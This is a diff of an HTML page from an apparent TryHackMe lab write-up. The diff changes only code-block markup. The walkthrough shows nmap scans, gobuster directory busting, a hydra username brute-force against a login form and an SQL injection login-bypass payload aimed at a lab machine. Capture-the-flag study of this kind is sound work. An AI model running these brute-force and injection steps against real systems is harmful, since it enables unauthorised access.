@@ -27,7 +27,7 @@ nmap -A -sC.."><meta name="generator" content="Hexo 7.1.1"></head><body class="i
 <p>Not working , robots txt maybe?</p>
 <p><img src="/../images/a3.png" alt="alt text"></p>
 <p>Nope.</p>
-<h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.63.208<br></code></pre></td></tr></table></figure>
+<h3 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h3><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.63.208</code></pre>
 <p><img src="/../images/a4.png" alt="alt text"></p>
 <p>Ports open : </p>
 <ul>
@@ -35,9 +35,9 @@ nmap -A -sC.."><meta name="generator" content="Hexo 7.1.1"></head><body class="i
 <li>80 http</li>
 </ul>
 <p>Full NMAP Scanning :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -A -sC -sV -p80,22 10.10.55.21 -Pn<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs bash">nmap -A -sC -sV -p80,22 10.10.55.21 -Pn</code></pre>
 <p><img src="/../images/a5.png" alt="alt text"></p>
-<h3 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.63.208](http://10.10.63.208/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt<br></code></pre></td></tr></table></figure>
+<h3 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h3><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u [http://10.10.63.208](http://10.10.63.208/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre>
 <p><img src="/../images/a6.png" alt="alt text"></p>
 <p>Found &#x2F;manual  but there’s nothing</p>
 <p><img src="/../images/a7.png" alt="alt text"></p>
@@ -48,7 +48,7 @@ nmap -A -sC.."><meta name="generator" content="Hexo 7.1.1"></head><body class="i
 <p><img src="/../images/a10.png" alt="alt text"></p>
 <p>We have a lot of payloads here : <a target="_blank" rel="noopener" href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></p>
 <p>Let’s reset the machine and try another SQL payload to bypass the login .. didn’t find anything, try to bruteforce the username with hydra :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hydra -L /home/kali/Desktop/Workspace/TryHackMe/SecLists/Usernames/xato-net-10-million-usernames.txt -p asd 10.10.93.0 http-post-form   <span class="hljs-string">&quot;/:username=^USER^&amp;password=^PASS^: Invalid username and password.&quot;</span><br></code></pre></td></tr></table></figure>
+<pre><code class="hljs bash">hydra -L /home/kali/Desktop/Workspace/TryHackMe/SecLists/Usernames/xato-net-10-million-usernames.txt -p asd 10.10.93.0 http-post-form   <span class="hljs-string">&quot;/:username=^USER^&amp;password=^PASS^: Invalid username and password.&quot;</span></code></pre>
 
 <p><img src="/../images/a11.png" alt="alt text"></p>
 <p>Ater trying this payload <code>admin’ AND 1=1#</code> with all the usernames finally one worked </p>
